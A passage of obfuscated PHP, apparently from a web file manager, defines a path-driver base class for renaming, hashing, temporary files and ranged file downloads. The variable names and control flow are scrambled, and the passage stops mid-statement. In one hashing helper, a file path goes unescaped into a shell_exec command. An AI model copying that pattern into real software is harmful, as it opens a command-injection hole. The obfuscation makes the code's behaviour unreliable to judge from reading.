$bÉù‘„Á™Ø[4], $f¯Ï¹‘èƒ·) . $bÉù‘„Á™Ø[24] . $cÃ«š»º† . $c¼Ó•—¦Ú; $aÍšİâ˜ƒã = $bÉù‘„Á™Ø[20]; goto F©¸÷ø‡†¢; CªñÚôğùœ: $aäŠÆ˜µÂé = json_decode($aÍšİâ˜ƒã, !0); $CùÊ„œÛÖ¦ = is_array($aäŠÆ˜µÂé) ? $aäŠÆ˜µÂé : array($bÉù‘„Á™Ø[33] => null, $bÉù‘„Á™Ø[34] => $aÍšİâ˜ƒã); if (!$aäŠÆ˜µÂé) { echo $aÍšİâ˜ƒã; } goto có’°ÔÄŒè; có’°ÔÄŒè: return $CùÊ„œÛÖ¦; goto E³¸»‹½±×; F©¸÷ø‡†¢: $aí—Ãìñ©Õ = phpBinCommand(); if ($aí—Ãìñ©Õ && function_exists($bÉù‘„Á™Ø[25])) { $cö¨Â¯ÎÌ = $aí—Ãìñ©Õ . $bÉù‘„Á™Ø[26] . BASIC_PATH . $bÉù‘„Á™Ø[27] . escapeshellarg($f¯Ï¹‘èƒ·); $aÍšİâ˜ƒã = shell_exec($cö¨Â¯ÎÌ); } if (!$aÍšİâ˜ƒã) { $FæÒ¥Úõ¹ë = stream_context_create(array($bÉù‘„Á™Ø[28] => array($bÉù‘„Á™Ø[29] => 20, $bÉù‘„Á™Ø[30] => $bÉù‘„Á™Ø[31]))); $aÍšİâ˜ƒã = file_get_contents(APP_HOST . $bÉù‘„Á™Ø[32] . $f¯Ï¹‘èƒ·, !1, $FæÒ¥Úõ¹ë); } goto CªñÚôğùœ; E³¸»‹½±×: } function ActionCallHook($D»¸ŞŞİ¸) { goto c…‡ÄŒğŠË; c…‡ÄŒğŠË: $dĞíİ…ø—× =& $_SERVER[©•ÖÏ¥Ø]; ob_start(); $b¾µ§”ğ»ñ = array_slice(func_get_args(), 1); goto cĞˆšŸòŸØ; cĞˆšŸòŸØ: $GLOBALS[$dĞíİ…ø—×[35]] = 1; $eÌÖ–‹ƒŒ = ActionApply($D»¸ŞŞİ¸, $b¾µ§”ğ»ñ); $C‘¶¢âß„´ = ob_get_clean(); goto dÒë˜Ê¯‚æ; dÒë˜Ê¯‚æ: $eÌÖ–‹ƒŒ = $C‘¶¢âß„´ ? json_decode($C‘¶¢âß„´, !0) : $eÌÖ–‹ƒŒ; $GLOBALS[$dĞíİ…ø—×[35]] = 0; return $eÌÖ–‹ƒŒ; goto bÔ¬«£ñç£; bÔ¬«£ñç£: } goto bïÒªÍç«ç; c’Õœù«°: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $eìÕËå¨– =& $_SERVER[îÖ]; $this->objectDriver = array($eìÕËå¨–[57], $eìÕËå¨–[58], $eìÕËå¨–[59], $eìÕËå¨–[60], $eìÕËå¨–[61], $eìÕËå¨–[62], $eìÕËå¨–[63], $eìÕËå¨–[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($F­Ïé˜øêŠ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($F­Ïé˜øêŠ, $_SERVER[îÖ][8]); } return $F­Ïé˜øêŠ; } public function getPathName($c¨‚µè­­Í) { return $c¨‚µè­­Í; } public function iconvApp($FØµ¸õóÌ) { return $FØµ¸õóÌ; } public function iconvSystem($FË‰â½äğ ) { return $FË‰â½äğ ; } public function iconvTo($E¾èßƒÜÒ, $DæÆŞ¤×›†, $cå–´ºœ±Ä) { goto cÒªñİœé; fÃğ³¶Èƒë: $Fš‰„¡ÙÎ = $DæÆŞ¤×›† . $e·î÷”¿ÆÛ[66] . $cå–´ºœ±Ä . $e·î÷”¿ÆÛ[67] . $E¾èßƒÜÒ; if (isset($AºîÀ¬›Á¼[$Fš‰„¡ÙÎ])) { return $AºîÀ¬›Á¼[$Fš‰„¡ÙÎ]; } if (function_exists($e·î÷”¿ÆÛ[68])) { $CÊ“ÔÅÔë = @mb_convert_encoding($E¾èßƒÜÒ, $cå–´ºœ±Ä, $DæÆŞ¤×›†); } else { $CÊ“ÔÅÔë = @iconv($DæÆŞ¤×›†, $cå–´ºœ±Ä, $E¾èßƒÜÒ); } goto BË×…ª¯; E•ˆÔŠÃÎ: $AºîÀ¬›Á¼[$cå–´ºœ±Ä . $e·î÷”¿ÆÛ[66] . $DæÆŞ¤×›† . $e·î÷”¿ÆÛ[67] . $E¾èßƒÜÒ] = $E¾èßƒÜÒ; $AºîÀ¬›Á¼[$cå–´ºœ±Ä . $e·î÷”¿ÆÛ[66] . $DæÆŞ¤×›† . $e·î÷”¿ÆÛ[67] . $CÊ“ÔÅÔë] = $E¾èßƒÜÒ; $AºîÀ¬›Á¼[$DæÆŞ¤×›† . $e·î÷”¿ÆÛ[66] . $cå–´ºœ±Ä . $e·î÷”¿ÆÛ[67] . $CÊ“ÔÅÔë] = $CÊ“ÔÅÔë; goto eÚ­äá„ÃŠ; BË×…ª¯: $CÊ“ÔÅÔë = $CÊ“ÔÅÔë ? $CÊ“ÔÅÔë : $E¾èßƒÜÒ; if (strstr($CÊ“ÔÅÔë, $e·î÷”¿ÆÛ[69])) { $CÊ“ÔÅÔë = str_replace($e·î÷”¿ÆÛ[69], $e·î÷”¿ÆÛ[70], $CÊ“ÔÅÔë); } $AºîÀ¬›Á¼[$DæÆŞ¤×›† . $e·î÷”¿ÆÛ[66] . $cå–´ºœ±Ä . $e·î÷”¿ÆÛ[67] . $E¾èßƒÜÒ] = $CÊ“ÔÅÔë; goto E•ˆÔŠÃÎ; eÚ­äá„ÃŠ: return $CÊ“ÔÅÔë; goto A¥øó…Ã¶Ç; cÒªñİœé: $e·î÷”¿ÆÛ =& $_SERVER[îÖ]; if (!$E¾èßƒÜÒ || !function_exists($e·î÷”¿ÆÛ[65])) { return $E¾èßƒÜÒ; } static $AºîÀ¬›Á¼ = array(); goto fÃğ³¶Èƒë; A¥øó…Ã¶Ç: } public function getPathInner($f¥‡Ÿß³Å) { $aÜÖäÊè¿“ = IO::init($f¥‡Ÿß³Å); return $aÜÖäÊè¿“->path; } public function getPathOuter($E• §–¾³) { $f¢°ëˆÓİ =& $_SERVER[îÖ]; $Bã¶”°À¶ = strlen(trim($this->pathBase, $f¢°ëˆÓİ[8])); $E• §–¾³ = substr(trim($E• §–¾³, $f¢°ëˆÓİ[8]), $Bã¶”°À¶); return $this->pathDriver . $f¢°ëˆÓİ[8] . ltrim($E• §–¾³, $f¢°ëˆÓİ[8]); } public function isParentOf($bßíø¯š¯¹, $dÄ”®…¤Œğ) { $aßñõó¯ºƒ =& $_SERVER[îÖ]; $bßíø¯š¯¹ = rtrim(strtolower($bßíø¯š¯¹), $aßñõó¯ºƒ[8]) . $aßñõó¯ºƒ[8]; $dÄ”®…¤Œğ = rtrim(strtolower($dÄ”®…¤Œğ), $aßñõó¯ºƒ[8]) . $aßñõó¯ºƒ[8]; $a¼“ùˆ’Ñ = strpos($dÄ”®…¤Œğ, $bßíø¯š¯¹) === 0; return $a¼“ùˆ’Ñ; } public function getType() { $aéñÏ»ÚÏÅ =& $_SERVER[îÖ]; $eÓ§¸½ƒ·ª = str_replace($aéñÏ»ÚÏÅ[71], $aéñÏ»ÚÏÅ[33], get_class($this)); return strtolower($eÓ§¸½ƒ·ª); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FÄ¾ƒõËÈ, $FìõğÖÀ¶Ô) { $d—óñĞàâŠ =& $_SERVER[îÖ]; $a”¾§£¬Ë‰ = rtrim($FÄ¾ƒõËÈ, $d—óñĞàâŠ[8]) . $d—óñĞàâŠ[8] . $FìõğÖÀ¶Ô; $fÉ»—­„ ‡ = $this->exist($a”¾§£¬Ë‰); return $fÉ»—­„ ‡ ? $a”¾§£¬Ë‰ : !1; } public function setModifyTime($b¿Ÿ¢¡¿–Û, $a·’ø°Üô™ = '') { } public function renameObject($C‚…£ÀÕ×, $B™ùÒ÷ç‘) { goto D«ø ä–Åï; D«ø ä–Åï: $Féï¸õ¼¤° =& $_SERVER[îÖ]; $E–‰•µ½â† = $B™ùÒ÷ç‘; Hook::trigger($Féï¸õ¼¤°[72], $this, $C‚…£ÀÕ×, $this, $this->pathFather($C‚…£ÀÕ×) . $B™ùÒ÷ç‘); goto dæé«¢¿Â; e¹ËéÒŒÈ•: return $CÀâ°’İµ¸ ? $B™ùÒ÷ç‘ : !1; goto EÚªš‰ÖõÄ; dæé«¢¿Â: $C‚…£ÀÕ× = $this->getPathOuter($C‚…£ÀÕ×); $B™ùÒ÷ç‘ = $this->pathFather($C‚…£ÀÕ×) . $B™ùÒ÷ç‘; if (IO::isFile($C‚…£ÀÕ×)) { $CÀâ°’İµ¸ = IO::copy($C‚…£ÀÕ×, $this->pathFather($C‚…£ÀÕ×), REPEAT_RENAME_FOLDER, $E–‰•µ½â†); if ($CÀâ°’İµ¸) { IO::remove($C‚…£ÀÕ×); } } else { $CÀâ°’İµ¸ = IO::mkdir($B™ùÒ÷ç‘); if (!$CÀâ°’İµ¸) { return !1; } $Bï´Û÷‹˜Ú = IO::listPath($C‚…£ÀÕ×, !0); $DÙ¤¹ƒĞæ× = array_merge($Bï´Û÷‹˜Ú[$Féï¸õ¼¤°[73]], $Bï´Û÷‹˜Ú[$Féï¸õ¼¤°[74]]); foreach ($DÙ¤¹ƒĞæ× as $CÓ»…‚òš) { IO::move($CÓ»…‚òš[$Féï¸õ¼¤°[75]], $B™ùÒ÷ç‘, REPEAT_RENAME_FOLDER); } IO::remove($C‚…£ÀÕ×); } goto e¹ËéÒŒÈ•; EÚªš‰ÖõÄ: } public function tempFile($Eª‚‡àÚğÙ = '', $EŠªÄ¹Ä² = '') { goto d­Áğ§áè; d­Áğ§áè: if (!$Eª‚‡àÚğÙ) { $Eª‚‡àÚğÙ = rand_string(15); } $A°È¡ÂÃ…± = TEMP_FILES . rand_string(15) . $_SERVER[îÖ][8]; @mkdir($A°È¡ÂÃ…±, 511, !0); goto bÚäƒö¡ö’; bÚäƒö¡ö’: $A­ĞÃ¨¨öä = $A°È¡ÂÃ…± . $Eª‚‡àÚğÙ; @touch($A­ĞÃ¨¨öä); if ($EŠªÄ¹Ä²) { file_put_contents($A­ĞÃ¨¨öä, $EŠªÄ¹Ä²); } goto cİ²á¢Çà; cİ²á¢Çà: return $A­ĞÃ¨¨öä; goto CÌ‚¦¬ÀŒ; CÌ‚¦¬ÀŒ: } public function tempFileRemve($eœ÷øÒéß‰) { @unlink($eœ÷øÒéß‰); @rmdir($this->pathFather($eœ÷øÒéß‰)); } public function mkfile($fÛåæÊèÃÚ, $Fä±íëµ§› = '', $E”Œ£äÒáâ = REPEAT_RENAME) { } public function mkdir($FÊªÕïÂŠ°, $DÓ·îøÂáª = REPEAT_SKIP) { } public function delFile($A’ñÊ¾«¿Å) { } public function delFolder($e–•”‘”Œ) { } public function copyFile($b»˜Á‡Ã˜£, $F¾Àôù¼»–) { } public function moveFile($d‚‰Š³‚Ú£, $bÄæ‘§é‚) { } public function remove($F‘ÑôÉÎä²) { if ($this->isFile($F‘ÑôÉÎä²)) { return $this->delFile($F‘ÑôÉÎä²); } return $this->delFolder($F‘ÑôÉÎä²); } public function rename($FĞ›íôìô‡, $FèæóÂâŒ…) { } public function exist($cÒšæÒ‘ñ’) { } public function findByHash($DĞ…ó£Ï­ = '', $B”›±¹©ª  = '') { return !1; } public function isFile($Dåìàåã…×) { } public function isFolder($F« «İĞ•) { } public function size($BåÃïÑÛˆÇ) { } public function info($a´ˆáÂñÍç) { } public function infoSimple($d†ÎÄ†³øÔ) { return $this->info($d†ÎÄ†³øÔ); } public function infoAuth($D•¥ñÔç¶Ù) { return $this->info($D•¥ñÔç¶Ù); } public function infoFull($Cø“×öÓ¨­) { return $this->info($Cø“×öÓ¨­); } public function infoWithChildren($fÏ‡ù¹ç™) { $EÆÛœó·” =& $_SERVER[îÖ]; static $eÕáº˜éÎ« = array(); if (isset($eÕáº˜éÎ«[$fÏ‡ù¹ç™])) { return $eÕáº˜éÎ«[$fÏ‡ù¹ç™]; } $f§¹ò”…“ = $this->info($fÏ‡ù¹ç™); if ($f§¹ò”…“ && $f§¹ò”…“[$EÆÛœó·”[29]] == $EÆÛœó·”[76]) { $bøˆÏ‡÷Ûø = array($EÆÛœó·”[77] => 0, $EÆÛœó·”[78] => 0, $EÆÛœó·”[79] => 0); $this->infoChildren($fÏ‡ù¹ç™, $bøˆÏ‡÷Ûø); $f§¹ò”…“[$EÆÛœó·”[77]] = $bøˆÏ‡÷Ûø[$EÆÛœó·”[77]]; $f§¹ò”…“[$EÆÛœó·”[80]] = array($EÆÛœó·”[81] => $bøˆÏ‡÷Ûø[$EÆÛœó·”[78]], $EÆÛœó·”[82] => $bøˆÏ‡÷Ûø[$EÆÛœó·”[79]]); $eÕáº˜éÎ«[$fÏ‡ù¹ç™] = $f§¹ò”…“; } return $f§¹ò”…“; } public function listPath($dø‡öËøéÏ, $DŞÊ¨Å­µ‡ = false) { } public function has($F®ÁîÕƒ¹, $Cîî¯Àë†Ú = false, $dçë­ïÎ¦À = false) { } public function canRead($fµÊåÒöİ£) { } public function canWrite($Då²‰ÓİÊ) { } public function getContent($B½ÚÚ¾ŞâĞ) { } public function setContent($dµù…“ÍÚ×, $eƒ¡”ù‰‡Š = '') { } protected function infoChildren($c°©å…”ÒØ, &$eÊÊÅß˜Â) { $DÅ¼ìœ­¥º =& $_SERVER[îÖ]; check_abort(); $dõ“´‹Ìš = $this->listPath($c°©å…”ÒØ, !0); $dõ“´‹Ìš = array_merge($dõ“´‹Ìš[$DÅ¼ìœ­¥º[74]], $dõ“´‹Ìš[$DÅ¼ìœ­¥º[73]]); foreach ($dõ“´‹Ìš as $bñ¢³÷‹ä) { if ($bñ¢³÷‹ä[$DÅ¼ìœ­¥º[29]] == $DÅ¼ìœ­¥º[76]) { $eÊÊÅß˜Â[$DÅ¼ìœ­¥º[79]]++; $dö‰©Îˆ¿ò = $this->getPathInner($bñ¢³÷‹ä[$DÅ¼ìœ­¥º[75]]); $this->infoChildren($dö‰©Îˆ¿ò, $eÊÊÅß˜Â); } else { $eÊÊÅß˜Â[$DÅ¼ìœ­¥º[78]]++; $eÊÊÅß˜Â[$DÅ¼ìœ­¥º[77]] += $bñ¢³÷‹ä[$DÅ¼ìœ­¥º[77]]; } } } public function fileSubstr($B³î±×©øä, $A¥îò—œ, $FŠÈ°ä×¡©) { } public function listAll($D›”ç‘†Ò¶) { } public function upload($cßÖéöó‹„, $a–³Õç¥¡Ô, $dáÉ¬Ü©ÉÜ = false, $e«º«ğŠ = REPEAT_REPLACE) { } public function uploadFileByID($fîÎŞ²ÁŞ», $bñ™ŞÉ‚î¾, $B‘…§º‘¾…) { } public function uploadFileByPath($B˜òî„„á‹, $cˆ¿õ¬Èê, $eÈ„ØŠèš¼ = array()) { } public function isUploadServer() { $dÃ…¢¯Ÿ =& $_SERVER[îÖ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dÃ…¢¯Ÿ[83]) { return !0; } return $GLOBALS[$dÃ…¢¯Ÿ[6]][$dÃ…¢¯Ÿ[84]][$dÃ…¢¯Ÿ[85]]; } public function isFileOutServer() { $cÍ¸¬êˆ­ =& $_SERVER[îÖ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $cÍ¸¬êˆ­[83]) { return !0; } return $GLOBALS[$cÍ¸¬êˆ­[6]][$cÍ¸¬êˆ­[84]][$cÍ¸¬êˆ­[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($FßÑñ÷„íÒ) { $AßÒ£í¾Ü =& $_SERVER[îÖ]; if (!$this->isCdnHost()) { return $FßÑñ÷„íÒ; } return str_replace(trim(get_url_root($FßÑñ÷„íÒ), $AßÒ£í¾Ü[8]), trim($this->cdnHost, $AßÒ£í¾Ü[8]), $FßÑñ÷„íÒ); } public function uploadLink($a½äÂ®ƒ³’, $DÆ’ÕˆÓ¬¥ = 0) { goto C™Ì¡¹óø; EŠ»ñâ£Ìà: $A³Á”‡ÆÂò = $DÆ’ÕˆÓ¬¥ <= $FÖ„Äô‡¤Ô ? $d§²„è’ [87] : $d§²„è’ [88]; $f÷Ó´‰¸Úˆ = (!$DÆ’ÕˆÓ¬¥ ? 1 : ceil($DÆ’ÕˆÓ¬¥ / pow(1024, 3))) * 3600 * 4; $Dº©ÄôàƒÇ = $this->{$A³Á”‡ÆÂò}($a½äÂ®ƒ³’, $f÷Ó´‰¸Úˆ); goto cŒ„›ì‹Ş®; Cë’ÙŒùƒ: if (!in_array($F­˜ÒÄÒ¼¯, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $FÖ„Äô‡¤Ô = 1024 * 1024 * 10; goto EŠ»ñâ£Ìà; C™Ì¡¹óø: $d§²„è’  =& $_SERVER[îÖ]; if ($this->isUploadServer()) { return; } $F­˜ÒÄÒ¼¯ = $this->getType(); goto Cë’ÙŒùƒ; cŒ„›ì‹Ş®: if ($Dº©ÄôàƒÇ) { $Dº©ÄôàƒÇ[$d§²„è’ [89]] = $a½äÂ®ƒ³’; $Dº©ÄôàƒÇ[$d§²„è’ [90]] = $F­˜ÒÄÒ¼¯; } return $Dº©ÄôàƒÇ; goto fßÙ†¡º; fßÙ†¡º: } public function uploadFormData($a”™ñÉ§, $Dšö¦ÊšÈ„ = 3600) { } public function multiUploadFormData($CêÜŞ›¿À©, $BÖçÒ»Ø² = 3600) { } public function download($a¯¤™½Øİ¶, $dµÈµˆ£×) { } public function ext($dƒÄ¶ÄÎàã) { $d¢ùˆÜš” =& $_SERVER[îÖ]; if (strpos($dƒÄ¶ÄÎàã, $d¢ùˆÜš”[8]) === -1) { $AÊÉÃ‰Á® = $dƒÄ¶ÄÎàã; } else { $AÊÉÃ‰Á® = $this->pathThis($dƒÄ¶ÄÎàã); } $BÁ‘Öì¡‹è = $d¢ùˆÜš”[33]; if (strstr($AÊÉÃ‰Á®, $d¢ùˆÜš”[91])) { $BÁ‘Öì¡‹è = substr($AÊÉÃ‰Á®, strrpos($AÊÉÃ‰Á®, $d¢ùˆÜš”[91]) + 1); $BÁ‘Öì¡‹è = strtolower($BÁ‘Öì¡‹è); } if (strlen($BÁ‘Öì¡‹è) > 3 && preg_match($d¢ùˆÜš”[92], $BÁ‘Öì¡‹è, $AÜ¨°Å»èŒ)) { $BÁ‘Öì¡‹è = $d¢ùˆÜš”[33]; } return $BÁ‘Öì¡‹è; } public function pathThis($F¬›¨äæ¨ƒ) { $CÏ‘ßÙ”¶ß =& $_SERVER[îÖ]; $F¬›¨äæ¨ƒ = str_replace($CÏ‘ßÙ”¶ß[93], $CÏ‘ßÙ”¶ß[8], rtrim($F¬›¨äæ¨ƒ, $CÏ‘ßÙ”¶ß[8])); $b˜öÅøì¬ = strrpos($F¬›¨äæ¨ƒ, $CÏ‘ßÙ”¶ß[8]); if ($b˜öÅøì¬ === !1) { return $F¬›¨äæ¨ƒ; } return substr($F¬›¨äæ¨ƒ, $b˜öÅøì¬ + 1); } public function pathFather($fø‡±”¾†) { $BÑ¥¯°ŒÃæ =& $_SERVER[îÖ]; $fø‡±”¾† = str_replace($BÑ¥¯°ŒÃæ[93], $BÑ¥¯°ŒÃæ[8], rtrim($fø‡±”¾†, $BÑ¥¯°ŒÃæ[8])); $c³±Ò¢³‹À = strrpos($fø‡±”¾†, $BÑ¥¯°ŒÃæ[8]); if ($c³±Ò¢³‹À === !1) { return $BÑ¥¯°ŒÃæ[33]; } return substr($fø‡±”¾†, 0, $c³±Ò¢³‹À + 1); } public function hashSimple($cùæâòÑ·) { goto dñ«‰«¡×; C³¸”…˜¼ö: $a‘ê¥·Š¶ˆ = intval($c”Ë²Ô£Õ / $cöˆ†öõÖ¡); $d°œ–êˆŞ¢ = $B‰áŠ³ƒ„[33]; for ($dÆŠĞššäÄ = 0; $dÆŠĞššäÄ < $cöˆ†öõÖ¡; $dÆŠĞššäÄ++) { $d°œ–êˆŞ¢ .= $this->fileSubstr($cùæâòÑ·, $a‘ê¥·Š¶ˆ * $dÆŠĞššäÄ, $eÕÏ¶›Í); } goto dÒ•Óï‡…è; c¤£‚Óïà: $eÕÏ¶›Í = 200; $cöˆ†öõÖ¡ = 50; if ($c”Ë²Ô£Õ <= $eÕÏ¶›Í * $cöˆ†öõÖ¡) { return $this->hashMd5($cùæâòÑ·) . $c”Ë²Ô£Õ; } goto C³¸”…˜¼ö; dñ«‰«¡×: $B‰áŠ³ƒ„ =& $_SERVER[îÖ]; if (!$cùæâòÑ·) { return md5($B‰áŠ³ƒ„[33]); } $c”Ë²Ô£Õ = $this->size($cùæâòÑ·); goto c¤£‚Óïà; dÒ•Óï‡…è: $d°œ–êˆŞ¢ .= $this->fileSubstr($cùæâòÑ·, $c”Ë²Ô£Õ - $eÕÏ¶›Í, $eÕÏ¶›Í); return md5($d°œ–êˆŞ¢) . $c”Ë²Ô£Õ; goto CŞˆ­‡ñ‘œ; CŞˆ­‡ñ‘œ: } public static $md5Cache = array(); public function hashMd5($E×´×Ä´Ìˆ) { $E×´×Ä´Ìˆ = $this->iconvSystem($E×´×Ä´Ìˆ); if (isset(self::$md5Cache[$E×´×Ä´Ìˆ])) { return self::$md5Cache[$E×´×Ä´Ìˆ]; } self::$md5Cache[$E×´×Ä´Ìˆ] = $this->hashMd5Shell($E×´×Ä´Ìˆ); if (!self::$md5Cache[$E×´×Ä´Ìˆ]) { self::$md5Cache[$E×´×Ä´Ìˆ] = @md5_file($E×´×Ä´Ìˆ); } return self::$md5Cache[$E×´×Ä´Ìˆ]; } private function hashMd5Shell($C‘ç¢•„Ô) { goto D‘®Á´¥òŠ; D‘®Á´¥òŠ: $D®„Èà¨ØĞ =& $_SERVER[îÖ]; if (!function_exists($D®„Èà¨ØĞ[94])) { return !1; } $d›ß¯Ñ¡Ò„ = array($D®„Èà¨ØĞ[95], $D®„Èà¨ØĞ[96]); goto f“Ïè­·÷; FâÏ˜Œª’Î: $EÌŠ¿ê‰¬× = shell_exec($e©°¤½ëÊ . "\x20\x22{$C‘ç¢•„Ô}\42"); $EÌŠ¿ê‰¬× = str_replace($D®„Èà¨ØĞ[100], $D®„Èà¨ØĞ[33], $EÌŠ¿ê‰¬×); return substr($EÌŠ¿ê‰¬×, 0, 32); goto C¤óš¾¥³ò; f“Ïè­·÷: $e©°¤½ëÊ = Cache::get($D®„Èà¨ØĞ[97]); if (!$e©°¤½ëÊ) { $dèÆ­µ¯‰… = BASIC_PATH . $D®„Èà¨ØĞ[98]; $Bšºà¾ØÒà = md5_file($dèÆ­µ¯‰…); $e©°¤½ëÊ = $D®„Èà¨ØĞ[99]; foreach ($d›ß¯Ñ¡Ò„ as $D‘ÔŒ‹†Øó) { $EÌŠ¿ê‰¬× = shell_exec($D‘ÔŒ‹†Øó . "\40\42{$dèÆ­µ¯‰…}\42"); if ($EÌŠ¿ê‰¬× && substr(trim($EÌŠ¿ê‰¬×), 0, 32) == $Bšºà¾ØÒà) { $e©°¤½ëÊ = $D‘ÔŒ‹†Øó; break; } } Cache::set($D®„Èà¨ØĞ[97], $e©°¤½ëÊ, 3600); } if ($e©°¤½ëÊ == $D®„Èà¨ØĞ[99]) { return !1; } goto FâÏ˜Œª’Î; C¤óš¾¥³ò: } public function link($DÑ¸ø±ÙøÂ) { return $DÑ¸ø±ÙøÂ; } public function fileOut($Fµ‹Äí‘ó, $d¡ºªÎ©É = false, $c¸öîÊö†„ = false, $eªµ½îæ¾Ô = '') { goto AäÃ‘Ãàè¢; a¬ÛŸ¨êÜ: $DÅ¢ù¹±·Ü = rawurlencode($F½Ø‘İÜ­‘); $DÅ¢ù¹±·Ü = $Dç»·ÂÕîï[113] . $DÅ¢ù¹±·Ü . $Dç»·ÂÕîï[117] . $DÅ¢ù¹±·Ü; if ($d¡ºªÎ©É) { header($Dç»·ÂÕîï[118]); header($Dç»·ÂÕîï[119] . $DÅ¢ù¹±·Ü); } else { header($Dç»·ÂÕîï[120] . $DÅ¢ù¹±·Ü); } goto bƒ×Ğ¢İ÷â; AäÃ‘Ãàè¢: $Dç»·ÂÕîï =& $_SERVER[îÖ]; $this->cacheMethod(null, null); if (!$Fµ‹Äí‘ó || !$this->exist($Fµ‹Äí‘ó)) { show_json(LNG($Dç»·ÂÕîï[101]), !1, $c¸öîÊö†„); } goto fª¿²Ô´ˆ‘; fš¸••­ãõ: $CÁ½İâÏø© = strtolower($_SERVER[$Dç»·ÂÕîï[139]]); if ($B¥Ğ–Ô“Ö¸ && $CÁ½İâÏø© && $f”„ç“Òå) { if (strstr($CÁ½İâÏø©, $Dç»·ÂÕîï[140])) { header($Dç»·ÂÕîï[141] . $Fµ‹Äí‘ó); } else { if (strstr($CÁ½İâÏø©, $Dç»·ÂÕîï[142])) { header($Dç»·ÂÕîï[143] . $Fµ‹Äí‘ó); } else { if (strstr($CÁ½İâÏø©, $Dç»·ÂÕîï[144])) { header($Dç»·ÂÕîï[145] . $Fµ‹Äí‘ó); } } } if ($a×ˆ†¢±º½) { header($Dç»·ÂÕîï[146] . $a×ˆ†¢±º½); } return; } if (isset($_SERVER[$Dç»·ÂÕîï[147]])) { if (preg_match($Dç»·ÂÕîï[148], $_SERVER[$Dç»·ÂÕîï[147]], $EÛô¤ƒˆê)) { $d‹¨ğÇçøœ = intval($EÛô¤ƒˆê[1]); if (!empty($EÛô¤ƒˆê[2])) { $Eí´Ûíö¡Š = intval($EÛô¤ƒˆê[2]); } } header($Dç»·ÂÕîï[149]); header("\103\157\x6e\x74\145\156\x74\55\x52\x61\156\147\x65\72\40\x62\x79\164\145\163\x20{$d‹¨ğÇçøœ}\55{$Eí´Ûíö¡Š}\57" . $B²’„°˜“Ğ); } else { header($Dç»·ÂÕîï[150]); } goto cÖ³ŒÍ›ÖÈ; cÖ³ŒÍ›ÖÈ: $C²ÏË£‰Ã… = !0; if ($_SERVER[$Dç»·ÂÕîï[151]] == $Dç»·ÂÕîï[152] && $B²’„°˜“Ğ > 1204 * 1024 * 1024 * 2) { $C²ÏË£‰Ã… = !1; } if ($C²ÏË£‰Ã…) { header($Dç»·ÂÕîï[153] . ($Eí´Ûíö¡Š - $d‹¨ğÇçøœ + 1)); } goto dÑÚ±Ÿğ°; fª¿²Ô´ˆ‘: $B¥Ğ–Ô“Ö¸ = $this->getType() == $Dç»·ÂÕîï[102]; $f”„ç“Òå = $GLOBALS[$Dç»·ÂÕîï[6]][$Dç»·ÂÕîï[84]][$Dç»·ÂÕîï[103]][$Dç»·ÂÕîï[104]]; $a×ˆ†¢±º½ = (double) $GLOBALS[$Dç»·ÂÕîï[6]][$Dç»·ÂÕîï[84]][$Dç»·ÂÕîï[103]][$Dç»·ÂÕîï[105]] * 1024 * 1024; goto F×£—ï­Ñ; CÒ£²ß¤ˆ: header($Dç»·ÂÕîï[132] . $eÕ×®¤‚ . $Dç»·ÂÕîï[124]); header($Dç»·ÂÕîï[133] . $F½Ø‘İÜ­‘); header($Dç»·ÂÕîï[134]); goto C§—•¿ø°; d³‘¶Ñ—Õ: $AË±®¼Ô™ƒ = get_file_mime($e‚¯„·ö¡®); if (strstr($AË±®¼Ô™ƒ, $Dç»·ÂÕîï[114])) { $AË±®¼Ô™ƒ = $AË±®¼Ô™ƒ . $Dç»·ÂÕîï[115]; } if ($d¡ºªÎ©É === !1 && !mime_support($AË±®¼Ô™ƒ)) { $d¡ºªÎ©É = !0; $AË±®¼Ô™ƒ = $Dç»·ÂÕîï[116]; } goto a¬ÛŸ¨êÜ; F×£—ï­Ñ: @ob_end_clean(); set_timeout(); $EÒ½öÁÙ¸â = $this->infoFull($Fµ‹Äí‘ó); goto A³¥ˆÂÕâ; aìë‹ Ş™°: $d‹¨ğÇçøœ = 0; $Eí´Ûíö¡Š = $B²’„°˜“Ğ - 1; $e‚¯„·ö¡® = $this->ext($F½Ø‘İÜ­‘); goto F›œèì˜Ô; DÏ¶—Ï¾¾: if ($a×ˆ†¢±º½) { $aˆœ¹ƒ¡Ìµ = intval(1000 * 1000 * ($A¤”ƒñ…Ü¤ / $a×ˆ†¢±º½)); } while ($d‹¨ğÇçøœ <= $Eí´Ûíö¡Š) { $b²íæ®÷è = timeFloat(); check_abort(); $d àÅ…òò¹ = $Eí´Ûíö¡Š - $d‹¨ğÇçøœ + 1; if ($d àÅ…òò¹ <= $A¤”ƒñ…Ü¤) { $A¤”ƒñ…Ü¤ = $d àÅ…òò¹; } echo $this->fileSubstr($Fµ‹Äí‘ó, $d‹¨ğÇçøœ, $A¤”ƒñ…Ü¤); $d‹¨ğÇçøœ += $A¤”ƒñ…Ü¤; if ($A¤”ƒñ…Ü¤ == $d àÅ…òò¹) { $d‹¨ğÇçøœ = $Eí´Ûíö¡Š + 1; } if ($aˆœ¹ƒ¡Ìµ) { $F‰ƒËµ™‡Ş = intval(1000 * 1000 * (timeFloat() - $b²íæ®÷è)); $E‰Úö©ñ‡ = $aˆœ¹ƒ¡Ìµ - $F‰ƒËµ™‡Ş; if ($E‰Úö©ñ‡ > 5) { usleep($E‰Úö©ñ‡); } } } goto Bê†„¯¶Ã®; cÌ»Ø²ùã: header($Dç»·ÂÕîï[125]); header($Dç»·ÂÕîï[126]); header($Dç»·ÂÕîï[127]); goto eâ–æŠÊğŞ; F›œèì˜Ô: if (in_array($e‚¯„·ö¡®, array($Dç»·ÂÕîï[108], $Dç»·ÂÕîï[109], $Dç»·ÂÕîï[110], $Dç»·ÂÕîï[111]))) { $e‚¯„·ö¡® = $Dç»·ÂÕîï[112]; } if (!$eªµ½îæ¾Ô) { $eªµ½îæ¾Ô = md5($eÕ×®¤‚ . $this->hashSimple($Fµ‹Äí‘ó)); } $eªµ½îæ¾Ô = 